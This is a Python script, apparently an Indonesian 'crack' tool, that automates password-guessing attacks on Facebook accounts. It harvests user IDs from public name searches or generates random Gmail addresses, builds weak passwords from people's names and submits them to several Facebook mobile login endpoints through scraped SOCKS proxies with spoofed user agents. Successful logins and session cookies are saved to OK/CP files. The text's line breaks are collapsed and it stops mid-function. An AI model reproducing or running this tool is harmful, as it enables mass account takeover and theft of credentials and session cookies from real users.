import requests,bs4,json,os,sys,random,datetime,time,reimport urllib3,rich,base64from bs4 import BeautifulSoup as sopfrom bs4 import BeautifulSoup as parserfrom bs4 import BeautifulSoup as parfrom concurrent.futures import ThreadPoolExecutor as tredfrom rich.console import Console as solfrom rich.console import Group as gpfrom rich.panel import Panel as nelfrom rich.panel import Panel as panelfrom rich import print as cetakfrom concurrent.futures import ThreadPoolExecutor as YoshiiDevfrom rich import print as printsfrom rich import prettyfrom rich.progress import Progress,SpinnerColumn,BarColumn,TextColumnfrom rich.text import Text as tekzdump = []memek = []ualu,ualuh = [],[]from rich.panel import Panelfrom rich.tree import Treefrom rich.console import Consolefrom rich.table import Tablefrom rich.columns import Columnsfrom rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumnconsole = Console()sys.stdout.write('\x1b]2; Yoshii-Dev\x07')def BentukConsole(text):return Console(width=50).print(Panel(text,style='color(8)'), justify='center')pretty.install()CON=sol()ugen2=[]ugen=[]cokbrut=[]ses=requests.Session()princp=[]from rich.console import Consolefrom rich.columns import Columnswa = Console()try:	file_color = open("data/theme_color","r").read()	color_text = file_color.split("|")[0]	color_panel = file_color.split("|")[1]except:	color_text = "[#00C8FF]"	color_panel = "#00C8FF"id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[]taplikasi=['no']cokbrut=[]method = []pwpluss,pwnya=[],[]def yoshiiDev(u):        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)#------------->GUDANG WARNA PADA TOOLS<-------------#M2 = "[#FF0000]";H2 = "[#00FF00]" K2 = "[#FFFF00]";B2 = "[#00C8FF]" P = '\x1b[1;97m';M = '\x1b[1;91m'H = '\x1b[1;92m';K = '\x1b[1;93m' B = '\x1b[1;94m';U = '\x1b[1;95m'O = '\x1b[1;96m';N = '\x1b[0m'P = '\x1b[1;97m';M = '\x1b[1;91m'H = '\x1b[1;92m';K = '\x1b[1;93m'B = '\x1b[1;94m';U = '\x1b[1;95m' O = '\x1b[1;96m';N = '\x1b[0m'    Z = "\033[1;30m";sir = '\033[41m\x1b[1;97m'x = '\33[m';m = '\x1b[1;91m'k = '\033[93m';h = '\x1b[1;92m' hh = '\033[32m';u = '\033[95m' kk = '\033[33m';b = '\33[1;96m' p = '\x1b[0;34m';P2 = "[#FFFFFF]" asu = random.choice([m,k,h,u,b])dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}tgl = datetime.datetime.now().daybln = dic[(str(datetime.datetime.now().month))]thn = datetime.datetime.now().yearokc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'def clear():	os.system('clear')def back():	YoshiiXhurayra()def banner():	yos = ('''[white]╔╗╔┌┬┐┌┐ ┌─┐  ╦╔═┌─┐┌─┐┌─┐┬┌─║║║│││├┴┐├┤   ╠╩╗│ ││  ├─┤├┴┐╝╚╝┴ ┴└─┘└    ╩ ╩└─┘└─┘┴ ┴┴ ┴\n{lines} {pess}''');BentukConsole(yos)def YoshiiXhurayra():	os.system('clear')	banner()	yoshi = ('\n 1 crack menggunakan nama akun \n 2 crack menggunakan email \n 3 view result akun crack \n 0 keluar dari tools');print(yoshi)	yoshii_____dev_____haxor______vip = input(f'\n ╰─  choose : ')	if yoshii_____dev_____haxor______vip in(''):		print(' ╰─  invalid ');back()	if yoshii_____dev_____haxor______vip in('1','01'):bagian_crack_dari_nama()	elif yoshii_____dev_____haxor______vip in('2','02'):bagian_crack_dari_email()	elif yoshii_____dev_____haxor______vip in('3','03'):	   prints(' maaf menu sedang dalam pengembangan');exit()	elif yoshii_____dev_____haxor______vip in('0'):	   prints(' ✓ logout berhasil sampai nanti');exit()def mencari_persamaan_nama_valid(link):	r = parser(ses.get(str(link)).text,'html.parser')	for x in r.find_all('td'):		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))		for uid,nama in data:			if 'profile.php?' in uid:				uid = re.findall('id=(.*)',str(uid))[0]			elif '<span' in nama:				nama = re.findall('(.*?)\<',str(nama))[0]			bo = uid+'|'+nama			if bo in id:pass			else:id.append(bo)	link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')	if(link):	  sys.stdout.write(f"\r ╰─  dump {len(id)} ...");sys.stdout.flush()	  time.sleep(0.0000003)	  mencari_persamaan_nama_valid(link)	else:	     print("\r")def bagian_crack_dari_nama():	nama = []	custom = [" yoshii"," kami"," siska"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," hendrik"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]	custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","albert ","naura ","naira ","mancung ","dewi ","josen ","johan ","slot ","sharil ","hendrik ","edo ","ridho ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]	cetak(f"\n tools hanya bisa mengumpulkan 5000 id")	nam = console.input(f' ╰─ enter name : ').split(",")	for ser in nam:				for outname in custom:			id = ser+outname			nama.append(id)		for lastname in custom2:			id = lastname+ser			nama.append(id)	with tred(max_workers=5) as thread:		for id in nama:			thread.submit(mencari_persamaan_nama_valid,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")	pengaturan_crack()def result():	cetak(f' 1[/][/] Hasil OK[/]\n 2[/][/] Hasil CP[/]\n 3[/][/] Kembali[/]'),	kz = input(f'{P} ╰─  Pilih : ')	if kz in ['2','02']:		try:vin = os.listdir('CP')		except FileNotFoundError:			print(' ╰─  File Tidak Di Temukan ')			time.sleep(3)			back()		if len(vin)==0:			print(' ╰─  Anda Tidak Memiliki Hasil CP ')			time.sleep(4)			back()		else:			cih = 0			lol = {}			for isi in vin:				try:hem = open('CP/'+isi,'r').readlines()				except:continue				cih+=1				if cih<10:					nom = '0'+str(cih)					lol.update({str(cih):str(isi)})					lol.update({nom:str(isi)})					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)				else:					lol.update({str(cih):str(isi)})					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)			geeh = input(f'\n{P}{x}{H} ╰─  {x}{P}{x} {P}Select{x} : ')			try:geh = lol[geeh]			except KeyError:				print(' ╰─  Pilih Yang Bener Kontol ')				exit()			try:lin = open('CP/'+geh,'r').read().splitlines()			except:				print(' ╰─  File Tidak Di Temukan ')				time.sleep(4)				back()			nocp=0			for cpku in range(len(lin)):				cpkuni=lin[nocp].split('|')				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'				sol().print(mark(cpkuh,style="yellow"))				nocp +=1			input('[ Klik Enter ]')			back()	elif kz in ['1','01']:		try:vin = os.listdir('OK')		except FileNotFoundError:			print(' ╰─  File Tidak Di Temukan ')			time.sleep(4)			back()		if len(vin)==0:			print(' ╰─  Anda Tidak Mempunyai File OK ')			time.sleep(4)			back()		else:			cih = 0			lol = {}			for isi in vin:				try:hem = open('OK/'+isi,'r').readlines()				except:continue				cih+=1				if cih<80:					nom = '0'+str(cih)					lol.update({str(cih):str(isi)})					lol.update({nom:str(isi)})					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)				else:					lol.update({str(cih):str(isi)})					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)			geeh = input('\n ╰─  Pilih : ')			try:geh = lol[geeh]			except KeyError:				print(' ╰─  Pilih Yang Bener Kontol ')				exit()			try:lin = open('OK/'+geh,'r').read().splitlines()			except:				print(' ╰─  File Tidak Di Temukan ')				time.sleep(4)				back()			nocp=0			for cpku in range(len(lin)):				cpkuni=lin[nocp].split('|')				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'				sol().print(mark(cpkuh,style="green"))				print(f'{hh}USER-AGENT : {x}{cpkuni[2]}')				nocp +=1			input('[ Klik Enter ]')			back()	elif kz in ['3','03']:		back()	else:		print(' ╰─  Pilih Yang Bener Kontol ')		exit()def pengaturan_crack():	print('')	cetak(f' 1 crack id terlama (noob)\n 2 crack id ternew (pro) \n 3 crack id old/new (legends)')	hu = input(f' ╰─  choose : ')	if hu in ['1','01']:		for tua in sorted(id):			id2.append(tua)	elif hu in ['2','02']:		muda=[]		for bacot in sorted(id):			muda.append(bacot)		bcm=len(muda)		bcmi=(bcm-1)		for xmud in range(bcm):			id2.append(muda[bcmi])			bcmi -=1	cetak(f'\n 1 m.async.facebook.com (pro)\n 2 async.facebook.com (legends) \n 3 reguler.facebook.com (noob)')	hc = input(f' ╰─  choose : ')	if hc in ['1','01']:		method.append('mobile')	if hc in ['2','02']:		method.append('async')	elif hc in ['3','03']:	    method.append('reguler')	else:		method.append('mobile')	cetak('''\n 1 password list v1 (hemat kuota)\n 2 password list v2 (normal kuota)\n password list v3 (boros kuota)''')	pwplus=input(f' ╰─  {P}choose : ')	if pwplus in ['03','3']:		pwpluss.append('ya')		pwku=input(f' ╰─  {P}tambahan : ')		pwkuh=pwku.split(',')		for xpw in pwkuh:			pwnya.append(xpw)	else:		pwpluss.append('no')	uatambah = input('\n ingin menambahkan user agent Y/N : ')	if uatambah in ['y','Ya','ya','Y']:		ualuh.append('ya')		bzer = input(f' ╰─  user agent : ')		ualu.append(bzer)	else:		ualuh.append('tidak')	passwrd()def passwrd():	global prog,des	os.system('clear')	banner()	shii = (" [yellow]CRACK SEDANG BERJALAN"); BentukConsole(shii)	prints(f'\n informasi : [yellow]hasil crack kamu telah tersimpan di folder OK/CP[white]')	print(' hidup matikan mode pesawat jika tidak ada hasil :v\n')	prog = Progress(SpinnerColumn('clock'),TextColumn(''),BarColumn(),TextColumn('{task.percentage:.0f}%'))	des = prog.add_task('',total=len(id2))	with prog:		with tred(max_workers=30) as pool:			for yuzong in id2:				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()				frs = nmf.split(' ')[0]				pwv = []				if len(nmf)<6:					if len(frs)<3:						pass					else:						pwv.append(nmf)						pwv.append(frs+'123')						pwv.append(frs+'1234')				else:					if len(frs)<3:						pwv.append(nmf)					else:						pwv.append(nmf)						pwv.append(frs+'12')						pwv.append(frs+'321')						pwv.append(frs+'123')						pwv.append(frs+'1234')						pwv.append(frs+'12345')						pwv.append(frs+'123456')				if 'ya' in pwpluss: 					for xpwd in pwnya:						pwv.append(xpwd)				else:pass				if 'async' in method:					pool.submit(crack,idf,pwv)				elif 'mobile' in method:					pool.submit(crackasync,idf,pwv)				elif 'reguler' in method:					pool.submit(crackreguler,idf,pwv)				else:					pool.submit(crack,idf,pwv)		print('')	print(' crack selesai ngab\n')	print(f' OK : {h}%s '%(ok))	print(f' CP : {k}%s{x} '%(cp))def crack(idf,pwv):	global loop,ok,cp	bo = random.choice([m,k,h,b,u,x])	ua = random.choice(ugen)	ua2 = random.choice(ugen2)	ses = requests.Session()	prog.update(des,description=f"{h}Mobile{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")	prog.advance(des) 	for pw in pwv:		try:			if 'ya' in ualuh: ua = ualu[0]			nip=random.choice(prox)			proxs= {'http': 'socks4://'+nip}			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=319416315681061&kid_directed_site=0&app_id=319416315681061&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.0%2Fdialog%2Foauth%3Fclient_id%3D319416315681061%26redirect_uri%3Dhttps%253A%252F%252Fnipponpaint.lk%252Fauth%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DSJXEIQfEoZipo9vosdllOlSqMEd1LCiPrfqYwv0j%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D843c65d4-a1cb-4561-a046-7416a55123b3%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fnipponpaint.lk%2Fauth%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DSJXEIQfEoZipo9vosdllOlSqMEd1LCiPrfqYwv0j%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])			koki+=' m_pixel_ratio=2.625; wd=412x756'			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)			if "checkpoint" in po.cookies.get_dict().keys():				tree = Tree(f" ")				tree.add(f"[bold yellow]{idf}|{pw}")				tree.add(f"[bold yellow]{ua}\n")				cetak(tree)				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')				akun.append(idf+'|'+pw)				cp+=1				break			elif "c_user" in ses.cookies.get_dict().keys():				ok+=1				coki=po.cookies.get_dict()				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])				tree = Tree(f"  ")				tree.add(f"[bold green]{idf}|{pw}")				tree.add(f"[bold green]{kuki}\n")				cetak(tree)				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')				cek_apk(session,coki)				break			else:				continue		except requests.exceptions.ConnectionError:			time.sleep(31)	loop+=1def crackasync(idf,pwv):	global loop,ok,cp	bo = random.choice([m,k,h,b,u,x])	ua = random.choice(ugen)	ua2 = random.choice(ugen2)	ses = requests.Session()	prog.update(des,description=f"{h}Async{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")	prog.advance(des) 	for pw in pwv:		try:			if 'ya' in ualuh: ua = ualu[0]			nip=random.choice(prox)			proxs= {'http': 'socks5://'+nip}			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=206428089508143&kid_directed_site=0&app_id=206428089508143&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D206428089508143%26redirect_uri%3Dhttps%253A%252F%252Fwww.zalora.co.id%252Fcustomer%252Fsocialconnect%252Fendpoint%253Fhauth_done%253DFacebook%26scope%3Demail%252Cuser_birthday%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0c67b520-a187-48a6-8125-3256fe975775%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.zalora.co.id%2Fcustomer%2Fsocialconnect%2Fendpoint%3Fhauth_done%3DFacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])			koki+=' m_pixel_ratio=2.625; wd=412x756'			heade={			"Host": "m.facebook.com",			"content-length": f"{len(str(dataa))}",			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),			"origin": "https://m.facebook.com",			"content-type": "application/x-www-form-urlencoded",			"user-agent": ua,			"accept": "*/*",			"x-requested-with": "com.microsoft.bing",			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',			"sec-ch-ua-platform": '"Android"',			"sec-ch-ua-mobile": "?1",			"sec-fetch-site": "same-origin",			"sec-fetch-mode": "cors",			"sec-fetch-dest": "empty",			"sec-fetch-user": "?1",			"referer": "https://free.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=1239138353201716&redirect_uri=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler&state=AMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB&scope=public_profile%2Cemail&display=popup&ret=login&fbapp_pres=0&logger_id=087a364c-3d69-45b4-a55b-047dae50317c&tp=unspecified",			"accept-encoding": "gzip, deflate br",			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",			}			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)			if "checkpoint" in po.cookies.get_dict().keys():				tree = Tree(f" ")				tree.add(f"[bold yellow]{idf}|{pw}")				tree.add(f"[bold yellow]{ua}\n")				cetak(tree)				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')				akun.append(idf+'|'+pw)				cp+=1				break			elif "c_user" in ses.cookies.get_dict().keys():				ok+=1				coki=po.cookies.get_dict()				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])				tree = Tree(f"  ")				tree.add(f"[bold green]{idf}|{pw}")				tree.add(f"[bold green]{kuki}\n")				cetak(tree)				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')				cek_apk(session,coki)				break			else:				continue		except requests.exceptions.ConnectionError:			time.sleep(31)	loop+=1def crackreguler(idf,pwv):	global loop,ok,cp	bo = random.choice([m,k,h,b,u,x])	ua = random.choice(ugen)	ua2 = random.choice(ugen2)	ses = requests.Session()	prog.update(des,description=f"{h}Reguler{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")	prog.advance(des) 	for pw in pwv:		try:			if 'ya' in ualuh: ua = ualu[0]			nip=random.choice(prox)			proxs= {'http': 'socks5://'+nip}			ses.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})			p = ses.get('https://m.facebook.com/login/?email='+idf).text			dataa ={'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),'li':re.search('name="li" value="(.*?)"', str(p)).group(1),'email':idf,'pass':pw}			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': 'empty','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login/?email='+idf,'accept-encoding':'gzip, deflate br','accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)			if "checkpoint" in po.cookies.get_dict().keys():				tree = Tree(f" ")				tree.add(f"[bold yellow]{idf}|{pw}")				tree.add(f"[bold yellow]{ua}\n")				cetak(tree)				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')				akun.append(idf+'|'+pw)				cp+=1				break			elif "c_user" in ses.cookies.get_dict().keys():				ok+=1				coki=po.cookies.get_dict()				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])				tree = Tree(f"  ")				tree.add(f"[bold green]{idf}|{pw}")				tree.add(f"[bold green]{kuki}\n")				cetak(tree)				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')				cek_apk(session,coki)				break			else:				continue		except requests.exceptions.ConnectionError:			time.sleep(31)	loop+=1def bagian_crack_dari_email():	rc = random.choice	rr = random.randint	xc = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']	global ok , cp	cetak(f'\n silahkan masukan nama yang ingin di crack secara random')	nama = console.input(f' ╰─  nama : ')	if ',' in str(nama):		print(f" ╰─  nama tidak ada")		time.sleep(3);exit()	cetak(f' silahkan masukan doamin ini > @gmail.com ')	doma = console.input(f' ╰─  Domain : ')	if '@' not in str(doma) or '.com' not in str(doma):		print(f" ╰─  invalid ")		time.sleep(3);exit()	cetak(f' disarankan untuk menggunakan metode async & regular')	jumlah = console.input(f' ╰─  Total Dump : ')	for xyz in range(int(jumlah)):		A = nama		B = [f'{str(rc(xc))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(xc))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(xc))}{str(rc(blk))}']		C = doma		D = f'{A}{str(rc(B))}{C}'		if D in id:pass		else:id.append(D+'|'+nama)		if len(dump)==999999:pengaturan_crack()		sys.stdout.write(f"\r ╰─  Mengumpulkan {len(id)} Idz...");sys.stdout.flush()		time.sleep(0.0000003)	print("\r")	pengaturan_crack()	try:	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text	open('.prox.txt','w').write(prox)except Exception as e:	print('[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mYoshiiDev')prox=open('.prox.txt','r').read().splitlines()for xd in range(10000):	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])	c=random.randrange(73,100)	d=random.randrange(4200,4900)	e=random.randrange(40,150)	uaku=f'Mozilla/5.0 (Linux; Android {a}; SAMSUNG SM-A305FN) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'	ugen2.append(uaku)for tu in range(1000):            a =random.randrange(3,12)            b = random.choice([            'SM-X11O',            'SM-J290F',            'SM-J610G',            'SM-M317F',            'SM-R765T',            'SM-G610M',            'SM-A730F',            'SM-Q130A',            'SM-J415N',            'SM-M205N'])            c = random.choice([            'OPM1',            'QP1A',            'PKQ1',            'RP1A',            'PPR1',            'TP1A',            'RKQ1',            'SP1A',            'PKQ1'])            d = random.randrange(1111, 2999)            e = random.randrange(11, 19)            f = random.randrange(73, 99)            g = random.randrange(4200, 4900)            h = random.randrange(40, 150)            uaku2 = f'Mozilla/5.0 (Linux; Android {a}; {b} Build/{c}.{d}.0.0{e}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{f}.0.{g}.{h} Mobile Safari/537.36'            ugen.append(uaku2)for x in range(10):	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])	c=random.randrange(73,100)	d=random.randrange(4200,4900)	e=random.randrange(40,150)	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'def uaku():	try:		ua=open('bbnew.txt','r').read().splitlines()		for ub in 